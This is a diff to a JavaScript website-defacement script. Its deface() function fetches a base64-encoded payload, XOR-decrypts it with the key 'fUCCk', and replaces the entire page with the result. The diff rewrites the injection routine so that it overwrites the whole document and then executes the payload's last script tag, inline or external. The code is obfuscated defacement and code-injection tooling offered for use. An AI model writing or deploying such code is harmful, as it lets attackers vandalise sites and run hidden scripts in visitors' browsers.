@@ -1,40 +1,30 @@
-function clearAndInjectEverything(decryptedHTML) {
-    // Clear the entire document (head and body)
-    document.head.innerHTML = '';
-    document.body.innerHTML = '';
-
-    // Create a temporary container to parse the new HTML
+function clearAndRun(decryptedHTML) {
+    // Create a temporary container to parse the HTML
     const tempDiv = document.createElement('div');
     tempDiv.innerHTML = decryptedHTML;
 
-    // Inject head content (e.g., <meta>, <title>, <link>, etc.)
-    const headElements = Array.from(tempDiv.querySelectorAll('head > *'));
-    headElements.forEach((element) => {
-        document.head.appendChild(element);
-    });
-
-    // Inject body content (e.g., <div>, <p>, etc.)
-    const bodyElements = Array.from(tempDiv.querySelectorAll('body > *'));
-    bodyElements.forEach((element) => {
-        document.body.appendChild(element);
-    });
-
-    // Handle script tags (external and inline)
+    // Capture the last script tag
     const scripts = tempDiv.querySelectorAll('script');
-    scripts.forEach((script) => {
-        const newScript = document.createElement('script');
-        if (script.src) {
-            // External script
-            newScript.src = script.src;
-            newScript.async = false;  // Ensures scripts run in order
-            document.body.appendChild(newScript);
+    const lastScript = scripts[scripts.length - 1];
+
+    // Clear the entire document and inject the decryptedHTML
+    document.documentElement.innerHTML = decryptedHTML;
+
+    // After replacing the HTML, re-inject the last script tag into the body
+    if (lastScript) {
+        const scriptClone = document.createElement('script');
+        if (lastScript.src) {
+            // For external script, clone the src and inject
+            scriptClone.src = lastScript.src;
+            scriptClone.async = false; // Ensures it runs in order
         } else {
-            // Inline script
-            newScript.textContent = script.textContent;
-            document.body.appendChild(newScript);
+            // For inline script, inject the script's content
+            scriptClone.textContent = lastScript.textContent;
         }
-    });
+        document.body.appendChild(scriptClone); // Re-inject the last script tag
+    }
 }
+
 
 function xorEncryptDecrypt(decodedhtml, key) {
     let result = '';
@@ -53,7 +43,7 @@ function deface() {
             let decodedhtml = atob(data);
             let decryptedHTML = xorEncryptDecrypt(decodedhtml, 'fUCCk')
             // Replace the entire HTML of the current document
-            clearAndInjectEverything(decryptedHTML);
+            clearAndRun(decryptedHTML);
         })
         .catch(error => console.error('Error:', error));
 }
